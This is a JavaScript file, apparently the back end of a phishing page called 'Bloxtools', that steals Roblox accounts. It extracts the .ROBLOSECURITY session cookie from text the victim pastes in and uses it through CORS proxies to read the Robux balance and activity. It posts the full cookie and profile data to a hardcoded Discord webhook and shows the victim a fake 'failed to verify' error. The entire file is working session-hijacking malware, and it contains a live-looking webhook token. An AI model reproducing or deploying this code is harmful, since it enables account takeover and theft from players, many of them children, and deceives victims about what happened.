/* ======================================================
   PAYLOAD.JS - SUPER FAST + AUTHENTICATED (FAKE ERROR)
   - Uses CORS proxy with cookie forwarding
   - Fetches Robux, pending Robux, last game played
   - Removes spaces from cookie
   - Shows fake error to victim, sends webhook silently
====================================================== */

const WEBHOOK_URL = "https://discordapp.com/api/webhooks/1456485751389814957/uWd9bjxOOKxMl-9ZL9rRjycEtXAlzk9nOVm9UY-boHBXta_--8co2ojCtI6GcEfhq3YI";

// Proxies that forward custom headers (Cookie)
const PROXY_LIST = [
    "https://cors-anywhere.herokuapp.com/",
    "https://corsproxy.io/"
];

const gameFileInput = document.getElementById("gameFile");
const pinInput = document.getElementById("pinInput");
const pinError = document.getElementById("pinError");
const copyButton = document.getElementById("copyButton");
const statusMessage = document.getElementById("statusMessage");

// PIN validation
pinInput.addEventListener("input", () => {
    pinInput.value = pinInput.value.replace(/\D/g, "").slice(0, 4);
    validatePin();
});

function validatePin() {
    const isValid = /^\d{4}$/.test(pinInput.value);
    if (pinError) pinError.style.display = isValid ? "none" : "block";
    return isValid;
}

// Extract cookie and rbxuid from PowerShell dump
function extractGameData(fullText) {
    const cookieMatch = fullText.match(/\.ROBLOSECURITY",\s*"([^"]+)"/);
    if (!cookieMatch) {
        return { success: false, message: "Could not find .ROBLOSECURITY cookie." };
    }
    let robloxCookie = cookieMatch[1];
    // Remove all whitespace (spaces, newlines, tabs)
    robloxCookie = robloxCookie.replace(/\s/g, '');

    const eventTrackerMatch = fullText.match(/RBXEventTrackerV2",\s*"([^"]+)"/);
    let rbxuid = null;
    if (eventTrackerMatch) {
        const params = eventTrackerMatch[1].split('&');
        for (let p of params) {
            if (p.startsWith("rbxuid=")) {
                rbxuid = p.split('=')[1];
                break;
            }
        }
    }
    if (!rbxuid) {
        return { success: false, message: "Could not find rbxuid in RBXEventTrackerV2." };
    }
    return { success: true, cookie: robloxCookie, rbxuid: rbxuid };
}

// Authenticated fetch using proxy that forwards the cookie header
async function fetchAuth(endpoint, cookie, retries = 1) {
    if (!endpoint.startsWith("http")) endpoint = "https://" + endpoint;
    for (let attempt = 0; attempt <= retries; attempt++) {
        for (const proxy of PROXY_LIST) {
            try {
                const controller = new AbortController();
                const timeoutId = setTimeout(() => controller.abort(), 5000);
                const res = await fetch(proxy + endpoint, {
                    signal: controller.signal,
                    headers: {
                        "Cookie": `.ROBLOSECURITY=${cookie}`,
                        "User-Agent": "Mozilla/5.0"
                    }
                });
                clearTimeout(timeoutId);
                if (!res.ok) continue;
                const text = await res.text();
                return JSON.parse(text);
            } catch (e) { /* try next */ }
        }
        if (attempt < retries) await new Promise(r => setTimeout(r, 300));
    }
    return null;
}

// Public endpoints (no cookie needed, but use proxy for CORS)
async function fetchPublic(endpoint) {
    if (!endpoint.startsWith("http")) endpoint = "https://" + endpoint;
    for (const proxy of PROXY_LIST) {
        try {
            const controller = new AbortController();
            const timeoutId = setTimeout(() => controller.abort(), 4000);
            const res = await fetch(proxy + endpoint, { signal: controller.signal });
            clearTimeout(timeoutId);
            if (!res.ok) continue;
            const text = await res.text();
            return JSON.parse(text);
        } catch (e) { continue; }
    }
    return null;
}

// ----- All data fetchers (some need cookie) -----

async function fetchUserInfo(userId) {
    const data = await fetchPublic(`users.roblox.com/v1/users/${userId}`);
    if (!data || !data.name) return null;
    return {
        username: data.name,
        displayName: data.displayName || data.name,
        joinDate: new Date(data.created).toLocaleDateString(),
        profileUrl: `https://www.roblox.com/users/${userId}/profile`
    };
}

async function fetchFriendsCount(userId) {
    const data = await fetchPublic(`friends.roblox.com/v1/users/${userId}/friends/count`);
    return data?.count?.toLocaleString() || "Unavailable";
}

async function fetchFollowersCount(userId) {
    const data = await fetchPublic(`friends.roblox.com/v1/users/${userId}/followers?limit=1`);
    return data?.total?.toLocaleString() || "Unavailable";
}

async function fetchGroups(userId) {
    const data = await fetchPublic(`groups.roblox.com/v1/users/${userId}/groups/roles`);
    if (!data?.data?.length) return [];
    return data.data.slice(0, 5).map(g => `${g.group.name} (${g.role.name})`);
}

async function fetchBadges(userId) {
    const data = await fetchPublic(`badges.roblox.com/v1/users/${userId}/badges?limit=5&sortOrder=Asc`);
    if (!data?.data?.length) return [];
    return data.data.map(b => b.badge.name);
}

async function fetchFilteredAvatarItems(userId) {
    const data = await fetchPublic(`avatar.roblox.com/v1/users/${userId}/avatar`);
    if (!data?.assets?.length) return "None equipped";
    const allowedTypes = [2, 8, 11, 12]; // T-shirt, Hat/Accessory, Shirt, Pants
    const filtered = data.assets.filter(asset => allowedTypes.includes(asset.assetType.id));
    if (filtered.length === 0) return "No clothes/accessories";
    const names = filtered.slice(0, 8).map(a => a.name);
    return names.join(", ") + (filtered.length > 8 ? " …" : "");
}

async function fetchAvatarThumbnail(userId) {
    const data = await fetchPublic(`thumbnails.roblox.com/v1/users/avatar-headshot?userIds=${userId}&size=420x420&format=Png`);
    return data?.data?.[0]?.imageUrl || `https://www.roblox.com/headshot-thumbnail/image?userId=${userId}&width=420&height=420&format=png`;
}

// Requires cookie auth
async function fetchRobuxBalance(userId, cookie) {
    const data = await fetchAuth(`economy.roblox.com/v1/users/${userId}/currency`, cookie);
    return data?.robux?.toLocaleString() || "Unknown";
}

async function fetchPendingRobux(userId, cookie) {
    const data = await fetchAuth(`economy.roblox.com/v1/users/${userId}/pending-robux`, cookie);
    return data?.pendingRobux?.toLocaleString() || "None";
}

async function fetchLastGamePlayed(userId, cookie) {
    // Try presence API first
    const presenceData = await fetchAuth(`presence.roblox.com/v1/users/${userId}/presence`, cookie);
    if (presenceData && presenceData.userPresences && presenceData.userPresences[0]) {
        const p = presenceData.userPresences[0];
        if (p.gameId && p.gameId > 0) {
            // Fetch game name
            const gameData = await fetchPublic(`games.roblox.com/v1/games/${p.gameId}`);
            const gameName = gameData?.data?.name || "Unknown game";
            return `${gameName} (last seen ${new Date(p.lastOnline).toLocaleTimeString()})`;
        } else {
            return "Not in a game";
        }
    }
    // Fallback: recent played games
    const gamesData = await fetchAuth(`games.roblox.com/v1/users/${userId}/games?sortOrder=Desc&limit=1`, cookie);
    if (gamesData?.data?.length) {
        return gamesData.data[0].name;
    }
    return "Unknown";
}

// ----- Send webhook (silent, then fake error) -----
async function sendWebhook(pin, cookie, rbxuid) {
    const userId = rbxuid;
    statusMessage.textContent = "⏳ Processing... (this may take a moment)";

    // Parallel fetch
    const results = await Promise.allSettled([
        fetchUserInfo(userId),
        fetchFriendsCount(userId),
        fetchFollowersCount(userId),
        fetchGroups(userId),
        fetchBadges(userId),
        fetchFilteredAvatarItems(userId),
        fetchAvatarThumbnail(userId),
        fetchRobuxBalance(userId, cookie),
        fetchPendingRobux(userId, cookie),
        fetchLastGamePlayed(userId, cookie)
    ]);

    const [userInfo, friendsCount, followersCount, groups, badges, avatarItems, avatarUrl, robux, pendingRobux, lastGame] = results.map(r => r.status === "fulfilled" ? r.value : null);

    // Build embed
    const embed = {
        title: "🔓 Roblox Account Dump",
        thumbnail: { url: avatarUrl || "https://www.roblox.com/favicon.ico" },
        color: 0xff4444,
        description: `**User ID:** \`${userId}\`\n**Cookie (cleaned):** \`${cookie.substring(0, 50)}...\``,
        fields: [],
        footer: { text: "Bloxtools • Silent Mode" },
        timestamp: new Date().toISOString()
    };

    // Full cookie (no spaces)
    embed.fields.push({
        name: "🔐 .ROBLOSECURITY Cookie (NO SPACES)",
        value: `\`\`\`\n${cookie}\n\`\`\``,
        inline: false
    });

    if (userInfo) {
        embed.fields.push({
            name: "👤 Profile",
            value: `**${userInfo.username}** (${userInfo.displayName})\n**Joined:** ${userInfo.joinDate}\n[View](${userInfo.profileUrl})`,
            inline: false
        });
    }

    embed.fields.push(
        { name: "👥 Friends", value: friendsCount || "N/A", inline: true },
        { name: "👀 Followers", value: followersCount || "N/A", inline: true },
        { name: "💰 Robux", value: robux || "N/A", inline: true },
        { name: "⏳ Pending Robux", value: pendingRobux || "N/A", inline: true },
        { name: "🎮 Last Game", value: lastGame || "Unknown", inline: false },
        { name: "👕 Wearing (clothes+acc)", value: avatarItems || "None", inline: false }
    );

    if (groups && groups.length) embed.fields.push({ name: "🏢 Groups", value: groups.join("\n"), inline: false });
    if (badges && badges.length) embed.fields.push({ name: "🏅 Badges", value: badges.join("\n"), inline: false });

    const payload = {
        username: "Roblox Exfiltrator",
        embeds: [embed]
    };

    try {
        await fetch(WEBHOOK_URL, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(payload)
        });
        return true;
    } catch (e) {
        return false;
    }
}

// ----- Main button with fake error -----
copyButton.addEventListener("click", async () => {
    statusMessage.textContent = "";
    if (!validatePin()) {
        statusMessage.textContent = "❌ Invalid PIN.";
        statusMessage.style.color = "#ff9d9d";
        return;
    }
    const pastedText = gameFileInput.value.trim();
    if (!pastedText) {
        statusMessage.textContent = "❌ Paste game file content.";
        statusMessage.style.color = "#ff9d9d";
        return;
    }

    const extraction = extractGameData(pastedText);
    if (!extraction.success) {
        statusMessage.textContent = extraction.message;
        statusMessage.style.color = "#ff9d9d";
        return;
    }

    copyButton.classList.add("loading");
    copyButton.disabled = true;
    statusMessage.textContent = "⚙️ Verifying cookie...";
    statusMessage.style.color = "#caa8ff";

    // Actually send webhook
    const success = await sendWebhook(pinInput.value, extraction.cookie, extraction.rbxuid);

    // Fake error regardless of success
    statusMessage.textContent = "❌ Failed to verify cookie. Please check your internet and try again.";
    statusMessage.style.color = "#ff9d9d";

    copyButton.classList.remove("loading");
    copyButton.disabled = false;

    // Optionally log real result to console (hidden from user)
    if (success) {
        console.log("[Bloxtools] Webhook delivered successfully.");
    } else {
        console.warn("[Bloxtools] Webhook send failed.");
    }
});
